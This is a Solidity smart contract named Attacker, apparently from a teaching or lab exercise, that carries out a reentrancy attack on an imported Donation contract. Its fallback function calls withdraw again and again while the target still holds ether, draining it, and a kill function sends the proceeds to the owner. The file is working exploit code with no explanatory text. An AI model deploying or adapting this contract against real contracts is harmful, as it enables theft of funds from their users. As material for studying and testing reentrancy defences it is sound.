pragma solidity ^0.5.11;

import "./Donation.sol";

contract Attacker {

    address payable public owner;
    Donation public donation;

    constructor(address payable _addr) public payable {
        owner = msg.sender;
        donation = Donation(_addr);
    }

    modifier onlyOwner {
        require (msg.sender == owner, "Only owner can call this function.");
        _;
    }

    function donate() external onlyOwner {
        donation.donate.value(0.5 ether)(address(this));
    }

    function() external payable {

        if (address(donation).balance > 0 ) {
            donation.withdraw(0.5 ether);
        }
    }

    function kill() external onlyOwner {
        selfdestruct(owner);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}
